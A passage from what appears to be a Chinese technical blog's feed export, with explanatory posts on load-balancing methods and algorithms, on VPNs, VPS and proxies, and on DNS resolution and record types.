src="https://www.freeimg.cn/i/2024/01/08/659bb1678560f.jpg" style="width:800px;"/></div></div><p>HTTP 重定向的优点：</p><ul><li>方案简单</li></ul><p>HTTP 重定向的缺点：</p><ul><li>性能较差：每次访问需要两次请求服务器，增加了访问的延迟</li><li>降低搜索排名：使用重定向后，搜索引擎会视为 SEO 作弊</li><li>如果负载均衡器宕机，就无法访问该站点</li></ul><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>由于其缺点比较明显，所以这种负载均衡策略实际应用较少</p></div><p><strong>DNS负载均衡是通过域名解析服务，将同一个域名指向多个IP地址，从而将用户的请求分配到不同的服务器上。HTTP负载均衡是通过一个负载均衡器，将用户的请求转发到后端的多个服务器上，根据服务器的负载情况和算法进行选择。</strong></p><h4 id="反向代理负载均衡"><a href="#反向代理负载均衡" class="headerlink" title="反向代理负载均衡"></a>反向代理负载均衡</h4><p>反向代理（Reverse Proxy）方式是指以<code>代理服务器</code>来接受网络请求，然后将请求转发给内网中的服务器，并将从内网中的服务器上得到的结果返回给网络请求的客户端。反向代理负载均衡属于七层负载均衡。</p><p>反向代理服务的主流产品：Nginx、Apache。一般我们使用服务器搭建一些小应用的时候，常常会用到反向代理。</p><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>正向代理：发生在客户端，是由用户主动发起的。翻墙软件就是典型的正向代理，客户端通过主动访问代理服务器，让代理服务器获得需要的外网数据，然后转发回客户端。</p><p>反向代理：发生在服务端，用户不知道代理的存在。</p></div><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/08/659bb3415f302.jpg" style="width:800px;"/></div></div><p>以 Nginx 为例：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/08/659bb34de95da.jpg" style="width:800px;"/></div></div><p>首先，在代理服务器上设定好负载均衡规则。然后，当收到客户端请求，反向代理服务器拦截指定的域名或 IP 请求，根据负载均衡算法，将请求分发到候选服务器上。其次，如果某台候选服务器宕机，反向代理服务器会有容错处理，比如分发请求失败 3 次以上，将请求分发到其他候选服务器上。</p><p>反向代理的优点：</p><ul><li>多种负载均衡算法：支持多种负载均衡算法，以应对不同的场景需求</li><li>可以监控服务器：基于 HTTP 协议，可以监控转发服务器的状态，如：系统负载、响应时间、是否可用、连接数、流量等，从而根据这些数据调整负载均衡的策略</li></ul><p>反向代理的缺点：</p><ul><li>额外的转发开销：反向代理的转发操作本身是有性能开销的，可能会包括创建连接，等待连接响应，分析响应结果等操作</li><li>增加系统复杂度：反向代理常用于做分布式应用的水平扩展，但反向代理服务存在以下问题，为了解决以下问题会给系统整体增加额外的复杂度和运维成本：<ol><li>反向代理服务如果自身宕机，就无法访问站点，所以需要有<code>高可用</code>方案，常见的方案有：主备模式（一主一备）、双主模式（互为主备）。</li><li>反向代理服务自身也存在性能瓶颈，随着需要转发的请求量不断攀升，需要有<code>可扩展</code>方案。</li></ol></li></ul><h4 id="IP-负载均衡"><a href="#IP-负载均衡" class="headerlink" title="IP 负载均衡"></a>IP 负载均衡</h4><p>IP 负载均衡是在网络层通过修改请求目的地址进行负载均衡。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/08/659bb660c9a90.jpg" style="width:800px;"/></div></div><p>如上图所示，IP 均衡处理流程大致为：</p><ol><li>客户端请求 192.168.137.10，由负载均衡服务器接收到报文。</li><li>负载均衡服务器根据算法选出一个服务节点 192.168.0.1，然后将报文请求地址改为该节点的 IP。</li><li>真实服务节点收到请求报文，处理后，返回响应数据到负载均衡服务器。</li><li>负载均衡服务器将响应数据的源地址改负载均衡服务器地址，返回给客户端。</li></ol><p>IP 负载均衡在内核进程完成数据分发，较反向代理负载均衡有更好的从处理性能。但是，由于所有请求响应都要经过负载均衡服务器，集群的吞吐量受制于负载均衡服务器的带宽。</p><h4 id="数据链路层负载均衡"><a href="#数据链路层负载均衡" class="headerlink" title="数据链路层负载均衡"></a>数据链路层负载均衡</h4><p>数据链路层负载均衡是指在通信协议的数据链路层修改 mac 地址进行负载均衡。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/08/659bb72b6b672.jpg" style="width:800px;"/></div></div><h2 id="负载均衡算法"><a href="#负载均衡算法" class="headerlink" title="负载均衡算法"></a>负载均衡算法</h2><p><strong>两步：</strong></p><ol><li>根据负载均衡算法在候选服务器列表选出一个服务器</li><li>将请求数据发送到该服务器上</li></ol><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>本文仅介绍最为常见的负载均衡算法的特性及原理：轮询、随机、最小活跃数、源地址哈希、一致性哈希。</p></div><p>推荐阅读<a href="https://cn.dubbo.apache.org/zh-cn/overview/core-features/load-balance/">Dubbo 官方负载均衡算法说明</a>，有源码详解。</p><h3 id="随机"><a href="#随机" class="headerlink" title="随机"></a>随机</h3><h4 id="随机算法"><a href="#随机算法" class="headerlink" title="随机算法"></a>随机算法</h4><p>随机（Random） 算法将请求随机分发到候选服务器。<br>随机算法 适合服务器硬件相同的场景。学习过概率论的都知道，调用量较小的时候，可能负载并不均匀，调用量越大，负载越均衡。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/08/659bcfeeda265.jpg" style="width:650px;"/></div></div><h4 id="加权随机算法"><a href="#加权随机算法" class="headerlink" title="加权随机算法"></a>加权随机算法</h4><p>由于随机算法可能导致服务器的负载不均匀，尤其是当服务器的性能或资源不一致的时候。想要解决这个问题，可以给每个服务器设置一个权重，表示其相对的处理能力或资源分配。权重越高的服务器，被选中的概率就越大，从而分配更多的请求。</p><p>根据服务器的实际情况，动态调整权重，以达到更好的负载均衡效果。例如，如果某个服务器的负载过高，可以降低其权重，减少其被选中的概率，从而缓解压力。反之，如果某个服务器的负载较低，可以提高其权重，增加其被选中的概率，从而提高资源利用率。</p><h3 id="轮询"><a href="#轮询" class="headerlink" title="轮询"></a>轮询</h3><h4 id="轮询算法"><a href="#轮询算法" class="headerlink" title="轮询算法"></a>轮询算法</h4><p>轮询（Round Robin）算法的策略是：将请求依次分发到候选服务器。</p><p>如下图所示，负载均衡器收到来自客户端的 6 个请求，(1, 3, 5) 的请求会被发送到服务器 1，(2, 4, 6) 的请求会被发送到服务器 2。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/08/659bd277b4369.jpg" style="width:650px;"/></div></div><p>该算法适合场景：各服务器处理能力相近，且每个事务工作量差异不大。如果存在较大差异，那么处理较慢的服务器就可能会积压请求，最终无法承担过大的负载。</p><h4 id="加权轮询算法"><a href="#加权轮询算法" class="headerlink" title="加权轮询算法"></a>加权轮询算法</h4><p>加权轮询（Weighted Round Robbin）算法在轮询算法的基础上，增加了权重属性来调节转发服务器的请求数目。性能高、处理速度快的节点应该设置更高的权重，使得分发时优先将请求分发到权重较高的节点上。</p><p>如下图所示，服务器 A 设置权重为 5，服务器 B 设置权重为 1，负载均衡器收到来自客户端的 6 个请求，那么 (1, 2, 3, 4, 5) 请求会被发送到服务器 A，(6) 请求会被发送到服务器 B。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/08/659bd2e2b1f69.jpg" style="width:650px;"/></div></div><h3 id="最小活跃数"><a href="#最小活跃数" class="headerlink" title="最小活跃数"></a>最小活跃数</h3><p>最小活跃数（Least Active）算法：将请求分发到连接数&#x2F;请求数最少的候选服务器（目前处理请求最少的服务器）。</p><ul><li>根据候选服务器当前的请求连接数，动态分配</li><li>适用于对系统负载较为敏感或请求连接时长相差较大的场景</li></ul><p>由于每个请求的连接时长不一样，如果采用简单的轮询或随机算法，都可能出现某些服务器当前连接数过大，而另一些服务器的连接过小的情况，这就造成了负载并非真正均衡。虽然，轮询或算法都可以通过加权重属性的方式进行负载调整，但加权方式难以应对动态变化。</p><p>例如下图中，(1, 3, 5) 请求会被发送到服务器 1，但是 (1, 3) 很快就断开连接，此时只有 (5) 请求连接服务器 1；(2, 4, 6) 请求被发送到服务器 2，只有 (2) 的连接断开。该系统继续运行时，服务器 2 会承担过大的负载。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/08/659bd3bbefd73.jpg" style="width:650px;"/></div></div><p>最小活跃数算法会记录当前时刻，每个候选节点正在处理的连接数，然后选择连接数最小的节点。该策略能够动态、实时地反应服务器的当前状况，较为合理地将负责分配均匀，适用于对当前系统负载较为敏感的场景。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/08/659bd428cbd66.jpg" style="width:650px;"/></div></div><p>加权最小活跃数（Weighted Least Connection）在最小活跃数的基础上，根据服务器的性能为每台服务器分配权重，再根据权重计算出每台服务器能处理的连接数。</p><p>最小活跃数算法实现要点：活跃调用数越小，表明该服务节点处理能力越高，单位时间内可处理更多的请求，应优先将请求分发给该服务。在具体实现中，每个服务节点对应一个活跃数 active。初始情况下，所有服务提供者活跃数均为 0。每收到一个请求，活跃数加 1，完成请求后则将活跃数减 1。在服务运行一段时间后，性能好的服务提供者处理请求的速度更快，因此活跃数下降的也越快，此时这样的服务提供者能够优先获取到新的服务请求、这就是最小活跃数负载均衡算法的基本思想。</p><h3 id="源地址哈希"><a href="#源地址哈希" class="headerlink" title="源地址哈希"></a>源地址哈希</h3><p>源地址哈希（IP Hash）算法：根据请求源 IP，通过哈希计算得到一个数值，用该数值在候选服务器列表的进行取模运算，得到的结果便是选中的服务器。可以保证同一IP的客户端的请求会转发到同一台服务器上，用来实现会话粘滞（Sticky Session）。</p><ul><li>保证特定用户总是请求到相同的服务器，若服务器宕机，会话会丢失</li></ul><h3 id="一致性哈希"><a href="#一致性哈希" class="headerlink" title="一致性哈希"></a>一致性哈希</h3><p>一致性哈希（Consistent Hash）算法的目标是：相同的请求尽可能落到同一个服务器上。</p><p>一致性哈希可以很好的解决稳定性问题，可以将所有的存储节点排列在首尾相接的Hash环上，每个key在计算Hash后会顺时针找到临接的存储节点存放。而当有节点加入或退出时，仅影响该节点在Hash环上顺时针相邻的后续节点。</p><ul><li><p>相同的请求是指：一般在使用一致性哈希时，需要指定一个 key 用于 hash 计算，可能是：</p><ol><li>用户 ID</li><li>请求方 IP</li><li>请求服务名称，参数列表构成的串</li></ol></li><li><p>尽可能是指：服务器可能发生上下线，少数服务器的变化不应该影响大多数的请求，当某台候选服务器宕机时，原本发往该服务器的请求，会基于虚拟节点，平摊到其它候选服务器，不会引起剧烈变动。</p></li></ul><h2 id="Anycast——任播技术"><a href="#Anycast——任播技术" class="headerlink" title="Anycast——任播技术"></a><strong>Anycast——任播技术</strong></h2><p>这个技术最成功的应用就是DNS和CDN。在我看来，任播主要有以下两个重要作用：</p><ul><li>负载均衡：通过将请求路由到最近的可用服务器，任播能够分摊网络流量，减轻特定服务器的负荷。这在大规模的分布式系统中非常有用，如内容分发网络（CDN）、域名系统（DNS）等，可以提高系统的性能和可扩展性。</li><li>近程服务访问：通过在多个地理位置部署相同的服务并使用任播方式路由请求，用户可以访问最近的服务节点，减少访问延迟。这在内容交付、在线购物等需要低延迟的应用中非常重要，可以提供更好的用户体验。</li></ul><p>简单来说，使用了任播以后，服务器对外就拥有了同一个IP，对于一个请求，就会使用距离最近的服务器进行响应。</p><p>任播使用特殊的路由协议来确定网络中的最近节点，这些节点是一组具有相同任播地址的目标节点。它可以将数据包从源节点发送到一组具有相同任播地址的目标节点中的最近节点。任播的实现依赖于特殊的路由协议，如边界网关协议（BGP），来根据网络拓扑和路由策略来选择最近的节点。任播节点可以位于同一子网或跨越多个网络区域。</p><p>关于边界网关协议（BGP）的细节，大家感兴趣请自行了解学习。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面提到的负载均衡和任播技术，两者相辅相成，它们不仅能有效缓解服务器的压力，还能在很大程度上缓解大规模、大流量的DDos攻击。这两大特性就在一定程度上保障了安全性和可靠性。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> CDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是“梯子”？大学生应该如何“科学”上网？</title>
      <link href="/posts/ba5c4fea.html"/>
      <url>/posts/ba5c4fea.html</url>
      <cover>https://www.freeimg.cn/i/2023/12/27/658c238575fd8.jpg</cover>
      <date>Wed Sep 06 2023 10:13:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本篇文章仅作为技术分享，无不良引导。作为一个遵纪守法的公民，理应知道“网络不是法外之地”，不应该在网络空间发表任何不正当言论。</p><h2 id="什么是-VPN？"><a href="#什么是-VPN？" class="headerlink" title="什么是 VPN？"></a>什么是 VPN？</h2><p>VPN(Virtual Private Network 虚拟专用隧道)，通过专有网络或则其他网络，为企业和企业，以及企业和个人搭建一条具有加密保护措施的虚拟隧道，从而实现互通互联。</p><p>现代社会，我们的日常办公已经离不开电脑和手机。新冠疫情刚刚过去，很多人们也渐渐从居家办公走了出来。但是日常生活还是离不开居家办公。就比如我们大学生，寒暑假放假也希望能访问学校内的网上资源，可是在学校外如何访问校内的内网资源呢？VPN就能很好地解决这个问题。</p><p>是的，其实VPN的出现，一开始是为了办公。可是现在，一说到VPN，我想大家一定会联想到“魔法”、“梯子”、“翻墙”……懂的都懂。</p><p>上世纪90年代的时候，大多数的企业一般使用HTTP协议，而HTTP协议最大的缺点就是明文传输，很不安全。因此，VPN出现了。VPN使得数据以加密的状态在公网中传输，大大提高了数据的安全性、完整性和一致性。</p><h2 id="VPN类型"><a href="#VPN类型" class="headerlink" title="VPN类型"></a>VPN类型</h2><p>一般分为站点到站点、客户端到站点两种：</p><ul><li><p>站点到站点</p><p>这种VPN一般应用于同一企业但在不同地点的内部网，也可以应用在不同企业的外部网。<br>站点到站点，这种端到端的模式，一般认为双方的位置相对固定，链接不间断。<br>双方的通信需要通过集线器，一端的集线器通过ISP将数据发送到公网中，通过公网数据到达另一端的集线器，最后到达目的地址。能在一定程度上防止中间人的攻击，在“中间人”看来，就是两个集线器之间在进行通信，而且数据已被加密。</p></li><li><p>客户端到站点</p><p>这种VPN比较适合应用于居家办公，灵活性更好。因为每个员工的办公地址是比较灵活多变的，因此适合这种不需要长时间链接的方式。而且这种类型的VPN可以使用浏览器直接通信，也可以另外安装客户端软件进行VPN通信。</p><p>这种VPN还分为全隧道和半隧道模式：</p><ol><li>选择全隧道模式：将所有的数据都通过公司</li><li>选择半隧道模式：办公少不了摸鱼，所以一般都会选择半隧道模式</li></ol></li></ul><h2 id="VPN职责"><a href="#VPN职责" class="headerlink" title="VPN职责"></a>VPN职责</h2><ul><li><p>保密（对应数据的机密性）</p><p>一般采用AES或3-DES进行加密，感兴趣的同学可以自行了解，如果后面有时间我专门整理一篇有关加密算法的文章。</p></li><li><p>完整（对应数据的完整性）</p><p>只有加密肯定是不够的，因为黑客还有可能直接破环你的数据，自己得不到，也不让你得到。<br>那么想要保证数据的完整性，就需要使用到Hash算法。这是一种信息摘要算法，将一串数据变为固定长度且唯一的一串字符。这样接收方可以用过hash值来判断数据是否完整。常见的哈希算法有md5、SHA系列，当然这里面还涉及到哈希碰撞之类的知识，不多展开，感兴趣的同学自行学习。</p></li><li><p>认证（对应数据的一致性）</p><p>其实就是对数据进行签名认证，来确认数据是否是有合法用户发出的，可以理解为身份认证。常见的算法有RSA和PSK等。</p></li></ul><h2 id="IPSec和SSL-TLS"><a href="#IPSec和SSL-TLS" class="headerlink" title="IPSec和SSL&#x2F;TLS"></a>IPSec和SSL&#x2F;TLS</h2><p>上面说到的职责的实现除了需要算法的支持，还需要各种协议的支撑。一般会用到IPSec和SSL&#x2F;TLS这两大框架。<br>至于一些细节上的问题需要大家自行深入学习，大家只要知道它们的核心就是S（Security）安全即可。</p><h3 id="IPSec"><a href="#IPSec" class="headerlink" title="IPSec"></a>IPSec</h3><p>IPSec框架可以用在站点到站点，也可以用在客户端到站点，用在站点到站点居多。IPSec主要应用OSI模型中的网络层，在OSI结构下，数据从应用层自上而下到物理层，再从物理层到应用层传输，会经过网络层。简单来说，数据在经过网络层时，IPSec会对数据进行加密，而SSL&#x2F;TLS是在表示层对数据进行加密。</p><h3 id="SSL-TLS"><a href="#SSL-TLS" class="headerlink" title="SSL&#x2F;TLS"></a>SSL&#x2F;TLS</h3><p>抓过包的同学应该都知道SSL&#x2F;TLS就是HTTPS里面的S，是一种加密协议。当我们使用浏览器访问某个网址时，离不开HTTPS协议，因此，SSL&#x2F;TLS框架一般应用于客户端到站点类型的VPN中。</p><h2 id="什么是-VPS？"><a href="#什么是-VPS？" class="headerlink" title="什么是 VPS？"></a>什么是 VPS？</h2><p>VPS是虚拟专用服务器，借助容器或者虚拟化技术，将一台物理服务器分割成多个虚拟服务器，每个服务器可以拥有独立的操作系统，可以绑定独立的IP地址，实现计算、存储、网络等资源隔离。</p><p>VPS和VPN还是有区别的，前者是一种服务器，而后者是一种虚拟网络。也有很多同学会购买VPS去访问外网，一般VPS会和云服务器作比较。云服务器跟VPS差不多，只不过云服务器是在一个服务器集群的基础上，划分出的计算和存储资源，而VPS是在一台服务器的基础上进行资源划分，在数据安全性、扩展性以及稳定性等层面，云服务器更胜一筹。<br>云服务器不是每个厂商都会有的，因为需要有大量的工作人员进行维护，而且需要根据实际的业务需求自研一套资源分配方案。它不像VPS那样已经有比较成熟的方案，只要抄作业就行。</p><h2 id="什么是代理-Proxy-？"><a href="#什么是代理-Proxy-？" class="headerlink" title="什么是代理(Proxy)？"></a>什么是代理(Proxy)？</h2><p>代理的工作原理是由代理服务器自己去访问你的目标网站，并加载它的内容，然后再把这些加载过的内容传递到你的窗口上。这样就相当于你在浏览目标网站了，因此代理经常被叫做“梯子”或者“桥”。另外，代理一般针对客户端，与之相对的是反向代理，反向代理一般针对服务端，它们保护的对象不同，而且现在不管是代理也好，还是反向代理也好，一般都有负载均衡的能力。</p><p>其实看到现在，大家应该都有感受了，访问外网肯定有那么一个“中间人”来做过渡。</p><h3 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h3><p>不需要直接链接到目标网站，因此目标网站就无法获取你的IP地址，取而代之获取的是代理服务器的IP地址。这样你就可以隐藏你的位置信息了。 当你访问大多数代理服务的时候，他们通常会要求你选择一个代理服务器所在的国家。你可以通过对应国家的代理服务器访问目标网站，这样目标网站就会认为你是在对应国家进行访问的。 比如，如果你想要访问的网站屏蔽了你所在的国家，那么你可以用代理服务器换上其他国家的IP，只要代理服务器所在的位置不在屏蔽范围之内，你就可以通过代理服务器实现访问了。</p><h2 id="可能的误解"><a href="#可能的误解" class="headerlink" title="可能的误解"></a>可能的误解</h2><p>很多同学可能会觉得使用了VPN能够隐藏自己的主机，其实并不然。我们知道使用VPN上网，地址被修改后的数据通过ISP的网络发送到VPN服务器，然后VPN服务器再把数据解密发送到真是的服务器，这之间就建立了一个无形的通道，称之为“隧道”技术，它是虚拟的、隐私的。</p><p>但是你把你想要访问的网站告诉VPN真的好吗？如果VPN出卖了你怎么办？前不久就有一个用户量挺大的VPN泄露了用户的私人信息，导致服务关停。就算你的VPN不会出卖你，你想要访问的IP地址已经在DNS解析时告诉了ISP，这样ISP也就能知道你访问了什么网站。上网是件非常复杂的事情，远没有我们想的那么简单。说实话，我们的个人信息早就被那些大厂扒得一干二净了。只能说从一定程度上VPN确实隐藏了我们的IP，但不绝对。</p><p>对于我们学生来说，使用VPN翻墙到外网学习技术，了解时事，我觉得还好吧。但是不能做出有损国家利益的事情，发表一些不正当言论。使用VPN翻墙本就是违法行为，但如果以学习的态度翻墙，问题可能还不大，总之大家谨言慎行就好啦，什么事情能做，什么不能做，分寸得拿捏。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>访问外网的方式也不止上面的这些，需要大家自己不断探索。作为使用者来说，可能感觉都一样，但其中蕴含着很多值得我们学习借鉴的知识。作为程序员的我们就应该有“探索宇宙”的精神鸭~</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> VPN </tag>
            
            <tag> VPS </tag>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS域名解析的底层逻辑描述</title>
      <link href="/posts/105a31a4.html"/>
      <url>/posts/105a31a4.html</url>
      <cover>https://www.freeimg.cn/i/2023/12/30/658f96450d395.jpg</cover>
      <date>Wed Aug 23 2023 12:16:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="简单粗暴的一句话解释"><a href="#简单粗暴的一句话解释" class="headerlink" title="简单粗暴的一句话解释"></a>简单粗暴的一句话解释</h2><p>网站通过域名来识别和定位，而域名通过DNS解析得到对应的IP地址，最终通过IP地址实现连接和访问。</p><p>比如我们使用ping命令ping百度：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/30/658fc010ec47e.png" style="width:600px;"/></div></div><p>可以看到baidu.com解析为ip：110.242.68.66</p><h2 id="域名与-IP-地址"><a href="#域名与-IP-地址" class="headerlink" title="域名与 IP 地址"></a>域名与 IP 地址</h2><ol><li>IP地址与域名是一对多的关系。一个ip地址可以对应多个域名，但是一个域名只有一个IP地址。</li><li>域名的出现就是为了方便管理和记忆ip。</li><li>IP 地址和域名之间的映射是通过域名系统（DNS）来实现的。</li></ol><h2 id="域名结构树"><a href="#域名结构树" class="headerlink" title="域名结构树"></a>域名结构树</h2><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/30/658fb35a4d048.png" style="width:600px;"/></div></div><p>根据上图可以直观地看出域名结构：</p><ol><li><p>根域</p><p>位于域名空间最顶层，一般用一个 “.” 表示</p></li><li><p>顶级域</p><p>一般代表一种类型的组织机构或国家地区，如 net、com、org、edu、gov、mil、cn、jp、hk</p></li><li><p>二级域</p><p>用来标明顶级域内的一个特定的组织，国家顶级域下面的二级域名由国家网络部门统一管理，如 .cn 顶级域名下面设置的二级域名：.com.cn、.net.cn、.edu.cn …</p></li><li><p>子域</p><p>二级域下所创建的各级域统称为子域，各个组织或用户可以自由申请注册自己的域名</p></li><li><p>主机</p><p>主机位于域名空间最下层，就是一台具体的计算机，如 www、mail 等都是具体的计算机名字</p></li></ol><h2 id="域名服务器-DNS系统"><a href="#域名服务器-DNS系统" class="headerlink" title="域名服务器&#x2F;DNS系统"></a>域名服务器&#x2F;DNS系统</h2><p>域名系统(Domain Name System, DNS)：因特网使用的命名系统，用来把便于人们记忆的具有特定含义的主机名转换为便于机器处理的IP地址。</p><p>域名服务器：因特网的域名系统被设计成一个联机分布式的数据库系统，并采用客户&#x2F;服务器模型。</p><p>主要有4种类型的域名服务器：</p><ul><li><p>根域名服务器</p><p>根域名服务器是最高层次的域名服务器，所有的根域名服务器都知道所有的顶级域名服务器的IP地址。<br>根域名服务器也是最重要的域名服务器，不管是哪个本地域名服务器，若要对因特网上任何一个域名进行解析，只要自己无法解析，就要先求助于根域名服务器。<br>因特网上有13个根域名服务器，尽管我们将这13个根域名服务器中的每个都视为单个服务器，但每个“服务器”实际上是冗余服务器的集群，以提供安全性和可靠性。<br>需要注意的是，根域名服务器用来管辖顶级域(如.com)， 通常它并不直接把待查询的域名直接转换成IP地址，而是告诉本地域名服务器下一步应当找哪个顶级域名服务器进行查询。</p></li><li><p>顶级域名服务器</p><p>这些域名服务器负责管理在该顶级域名服务器注册的所有二级域名。<br>当收到DNS查询请求时,就给出相应的回答(可能是最后的结果，也可能是下一步应当查找的域名服务器的IP地址)。</p></li><li><p>授权域名服务器(权限域名服务器)</p><p>每台主机都必须在授权域名服务器处登记。为了更加可靠地工作，一台主机最好至少有两个授权域名服务器。<br>实际上，许多域名服务器都同时充当本地域名服务器和授权域名服务器。<br>授权域名服务器总能将其管辖的主机名转换为该主机的IP地址。</p></li><li><p>本地域名服务器</p><p>本地域名服务器对域名系统非常重要。<br>每个因特网服务提供者(ISP)， 或一所大学，甚至一所大学中的各个系，都可以拥有一个本地域名服务器。<br>当一台主机发出DNS查询请求时，这个查询请求报文就发送给该主机的本地域名服务器。<br>事实上，我们在Windows系统中配置“本地连接”时，就需要填写DNS地址，这个地址就是本地DNS (域名服务器)的地址。</p></li></ul><h2 id="域名解析过程"><a href="#域名解析过程" class="headerlink" title="域名解析过程"></a>域名解析过程</h2><ul><li>域名解析是指把域名映射成为IP地址或把IP地址映射成域名的过程。前者称为正向解析，后者称为反向解析。</li><li>当客户端需要域名解析时，通过本机的DNS客户端构造一个DNS请求报文，以<code>UDP数据报</code>方式发往本地域名服务器。</li><li>域名解析有两种方式:<code>递归查询</code>和<code>递归与迭代</code>相结合的查询。</li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/30/658fbd346c84d.png" style="width:800px;"/></div></div><div class="note success simple"><p>1.为了提高DNS的查询效率，并减少因特网上的DNS查询报文数量，在域名服务器中广泛地使用了高速缓存。<br>2.当一个DNS服务器接收到DNS查询结果时，它能将该DNS信息缓存在高速缓存中。这样，当另一个相同的域名查询到达该DNS服务器时，该服务器就能够直接提供所要求的IP地址，而不需要再去向其他DNS服务器询问。<br>3.因为主机名和IP地址之间的映射不是永久的，所以DNS服务器将在一段时间后丢弃高速缓存中的信息。</p></div><h2 id="域名解析记录类型"><a href="#域名解析记录类型" class="headerlink" title="域名解析记录类型"></a>域名解析记录类型</h2><p>相信买过域名的同学都使用过域名解析，还会发现有很多不同的类型和记录值，第一次用的时候还是有些懵的，所以去学习了一下，回来记录。</p><h4 id="A"><a href="#A" class="headerlink" title="A"></a>A</h4><p>用来指定主机名（或域名）对应IP地址的记录。<br>用户可以将该域名下的网站服务器指向到自己的web server上，同时也可以设置域名的子域名。<br>比如我们添加一条A记录将www的主机指向IP为192.168.1.1，那么当你访问www主机时就会解析到192.168.1.1这个IP上。</p><h4 id="CNAME"><a href="#CNAME" class="headerlink" title="CNAME"></a>CNAME</h4><p>常被称为别名解析，是主机名到主机名的映射。<br>当需要将域名指向另一个域名，再由另一个域名提供 IP 地址，就需要添加 CNAME 记录。与A记录不同，CNAME的记录值不是一个固定的IP，而是主机的别名地址。<br>别名解析可以提供更大的灵活性，便于统一管理。比如，当主机因某种因素的影响需要更换IP时，如果域名做了CNAME记录，就可以同时更新别名的解析指向，不需要进行新的解析操作。<br>应用场景包括CDN、企业邮箱、全局流量管理等。</p><h4 id="TXT"><a href="#TXT" class="headerlink" title="TXT"></a>TXT</h4><p>一般指为某个主机名或域名设置的说明，或者联系方式，或者标注提醒等等，相对简单。<br>TXT 记录常用的方式还有做 SPF 记录（反垃圾邮件）和SSL证书的DNS验证等。</p><h4 id="NS"><a href="#NS" class="headerlink" title="NS"></a>NS</h4><p>如果需要把子域名交给其他DNS服务商解析，就需要添加NS记录（Name Server）。<br>NS记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。NS记录中的IP即为该DNS服务器的IP地址。大多数域名注册商默认用自己的NS服务器来解析用户的DNS记录。<br>比如我的一级域名为xxfer.cn，而博客使用的是blog.xxfer.cn这个二级域名，在将这个二级域名指向GitHub源服务器IP时，如果不做二级域名（子域名）的NS解析，会发现二级域名无法正确解析。一般想要使用个人域名的一个子域名时，需要在一级域名做两条NS解析记录，记录值一般为ns1.domain.com、ns2.domain.com。</p><div class="note default modern"><p>上面应该是比较常见的几种解析记录类型</p></div><h4 id="SOA"><a href="#SOA" class="headerlink" title="SOA"></a>SOA</h4><p>SOA，是起始授权机构记录，说明了在众多 NS 记录里哪一台才是主要的服务器。在任何DNS记录文件中，都是以SOA ( Startof Authority )记录开始。SOA资源记录表明此DNS名称服务器是该DNS域中数据信息的最佳来源。<br>SOA记录与NS记录的区别：NS记录表示域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析；SOA记录设置一些数据版本和更新以及过期时间等信息。</p><h4 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h4><p>用于识别哪些服务器被允许代表你的域名发送电子邮件。<br>它通过列出已被授权为你的域名发送电子邮件的服务器来做到这一点。如果任何其他服务器试图代表你的域名发送电子邮件，它将被拒绝为未经授权的发件人。</p><h4 id="AAAA"><a href="#AAAA" class="headerlink" title="AAAA"></a>AAAA</h4><p>用来将域名解析到IPv6地址的DNS记录。<br>用户可以将一个域名解析到IPv6地址上，也可以将子域名解析到IPv6地址上。国内大多数IDC不支持AAAA记录的解析，因此如果想进行AAAA记录解析，则需对域名NS记录设置一些专业的域名解析服务商，由他们提供AAAA记录的设置。<br>国科云云解析支持IPv6环境下的AAAA记录解析。<br>AAAA记录与A记录的区别就在于解析到的IP地址为IPv4还是IPv6。</p><h4 id="MX"><a href="#MX" class="headerlink" title="MX"></a>MX</h4><p>邮件交换记录。<br>用于将以该域名为结尾的电子邮件指向对应的邮件服务器以进行处理。如：用户所用的邮件是以域名mydomain.com为结尾的，则需要在管理界面中添加该域名的MX记录来处理所有以@mydomain.com结尾的邮件。<br>主要用于邮箱解析，在邮件系统发送邮件时根据收信人的地址后缀进行邮件服务器的定位。另外，MX记录允许设置一个优先级，当多个邮件服务器可用时，会根据该值决定投递邮件的服务器。</p><h4 id="PTR"><a href="#PTR" class="headerlink" title="PTR"></a>PTR</h4><p>“反向DNS”，可以粗略理解为是一个指针记录，用于将一个IP地址映射到对应的主机名，也可以看成是A记录的反向，即通过IP访问域名。</p><h4 id="SRV"><a href="#SRV" class="headerlink" title="SRV"></a>SRV</h4><p>服务定位资源记录，用于定义提供特定服务的服务器的位置，如主机（hostname），端口（port 